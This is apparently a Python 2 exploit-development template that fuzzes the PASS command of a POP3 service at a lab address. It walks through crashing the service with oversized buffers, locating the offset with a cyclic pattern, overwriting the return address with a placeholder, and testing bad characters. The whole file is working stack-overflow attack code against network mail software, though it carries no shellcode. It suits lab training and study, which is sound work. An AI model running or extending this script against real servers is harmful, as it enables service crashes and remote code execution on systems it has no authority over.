#!/usr/bin/python
import socket
import sys
import re

#this is a base fuzzing script for the Password input on a POP3 connection
#Step 1: Set the IP Address and Port, you may also need to tune the socket interaction below
#    Main function should be set to findBUfferOverFlow
IP_ADDRESS = '10.10.10.10'
PORT = 110
#Step 2: Tune the buffer creation to trigger a crash by running the script
#    Main function should be set to findBUfferOverFlow
buffer_start_length = 0
max_iteration =30 
buffer_increment =200 
#Step 3: After you're close, reset the buffer_start_length above and enable the unique string to find the fail point
#    Main function should be set to findBUfferOverFlow
enable_unique = 0


# unique pattern generated with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 500 
#then truncate it to the buffer increment


def findBufferOverFlow():    
  for iteration_count in range (0, max_iteration):
    buffer_length = buffer_start_length +iteration_count*buffer_increment
    print "Fuzzing PASS %s with %s bytes" % (iteration_count, buffer_length)
    if enable_unique:
      buffer_string = "A"*(buffer_length - buffer_increment) + getUniquePattern(buffer_increment)
    else:
      buffer_string = "A"*(buffer_length)
    interactWithService(IP_ADDRESS, PORT, buffer_string)
    print "Fuzzing Pass %s completed.-----------------------" % iteration_count

def findControl():
  buffer_length = 2700
  offset = 2606
  jump_address = "BBBB"
  backfill1 ="C"*4
  backfillleftover="C"
  buffer_string = "A"*offset + jump_address + backfill1 + backfillleftover*(buffer_length - offset - len(jump_address) - len(backfill1))
  interactWithService(IP_ADDRESS, PORT, buffer_string)
  print "FindControl Buffer Sent"

def findBadChars():
  offset = 2606  
  badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00" 
  "AAAA")
  badchars = re.sub(r'\x00', "", badchars)
  badchars = re.sub(r'\x0a', "", badchars)
  badchars = re.sub(r'\x0d', "", badchars)
  
  #repeat for other bad characters.
  buffer_string= "A"*2606 + "B"*4 + badchars
  interactWithService(IP_ADDRESS, PORT, buffer_string)
  print "FindBadChars completed."
  

def interactWithService(IP_ADDRESS, PORT, buffer_string):
    try:  
      s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      connect=s1.connect((IP_ADDRESS,PORT))
      s1.recv(1024)
      s1.send('USER test\r\n')
      s1.recv(1024)
      #print "%s %s" % (len(buffer_string),buffer_string)
      s1.send('PASS ' + buffer_string + '\r\n')
      s1.send('QUIT\r\n')
      s1.close()
    except:
      print "POP3 Connection Failure"



def getUniquePattern (patternLength):
  unique_pattern = "Aa0Aa1Aa2A"#0
  unique_pattern +="a3Aa4Aa5Aa"#1
  unique_pattern +="6Aa7Aa8Aa9"#2
  unique_pattern +="Ab0Ab1Ab2A"#3
  unique_pattern +="b3Ab4Ab5Ab"#4
  unique_pattern +="6Ab7Ab8Ab9"#5
  unique_pattern +="Ac0Ac1Ac2A"#6
  unique_pattern +="c3Ac4Ac5Ac"#7
  unique_pattern +="6Ac7Ac8Ac9"#8
  unique_pattern +="Ad0Ad1Ad2A"#9
  unique_pattern +="d3Ad4Ad5Ad"#10
  unique_pattern +="6Ad7Ad8Ad9"#11
  unique_pattern +="Ae0Ae1Ae2A"#12
  unique_pattern +="e3Ae4Ae5Ae"#13
  unique_pattern +="6Ae7Ae8Ae9"#14
  unique_pattern +="Af0Af1Af2A"#15
  unique_pattern +="f3Af4Af5Af"#16
  unique_pattern +="6Af7Af8Af9"#17
  unique_pattern +="Ag0Ag1Ag2A"#18
  unique_pattern +="g3Ag4Ag5Ag"#19
  unique_pattern +="6Ag7Ag8Ag9"#20
  unique_pattern +="Ah0Ah1Ah2A"#21
  unique_pattern +="h3Ah4Ah5Ah"#22
  unique_pattern +="6Ah7Ah8Ah9"#23
  unique_pattern +="Ai0Ai1Ai2A"#24
  unique_pattern +="i3Ai4Ai5Ai"#25
  unique_pattern +="6Ai7Ai8Ai9"#26
  unique_pattern +="Aj0Aj1Aj2A"#27
  unique_pattern +="j3Aj4Aj5Aj"#28
  unique_pattern +="6Aj7Aj8Aj9"#29
  unique_pattern +="Ak0Ak1Ak2A"#30
  unique_pattern +="k3Ak4Ak5Ak"#31
  unique_pattern +="6Ak7Ak8Ak9"#32
  unique_pattern +="Al0Al1Al2A"#33
  unique_pattern +="l3Al4Al5Al"#34
  unique_pattern +="6Al7Al8Al9"#35
  unique_pattern +="Am0Am1Am2A"#36
  unique_pattern +="m3Am4Am5Am"#37
  unique_pattern +="6Am7Am8Am9"#38
  unique_pattern +="An0An1An2A"#39
  unique_pattern +="n3An4An5An"#40
  unique_pattern +="6An7An8An9"#41
  unique_pattern +="Ao0Ao1Ao2A"#42
  unique_pattern +="o3Ao4Ao5Ao"#42
  unique_pattern +="6Ao7Ao8Ao9"#44
  unique_pattern +="Ap0Ap1Ap2A"#45
  unique_pattern +="p3Ap4Ap5Ap"#46
  unique_pattern +="6Ap7Ap8Ap9"#47
  unique_pattern +="Aq0Aq1Aq2A"#48
  unique_pattern +="q3Aq4Aq5Aq"#49
  unique_pattern = unique_pattern[:patternLength]
  return unique_pattern


if __name__ == "__main__":
  #findBufferOverFlow()
  #findControl()
  findBadChars()
